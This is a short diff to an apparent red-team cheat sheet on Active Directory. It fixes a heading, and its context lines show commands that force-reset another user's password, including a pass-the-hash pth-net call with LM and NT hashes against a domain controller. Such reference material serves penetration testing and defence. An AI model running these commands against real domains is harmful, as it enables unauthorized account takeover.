@@ -11,7 +11,7 @@ net rpc password TargetUser -U <domain/your_user> -S <dc>
 pth-net rpc password 'TargetUser' "NewPassword" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
 ```
 
-## PowerShell from another account if of Source Account is Known
+## PowerShell from another account if the Source Account Password is Known
 
 ````bash
 $SecPassword = ConvertTo-SecureString 'your_password' -AsPlainText -Force
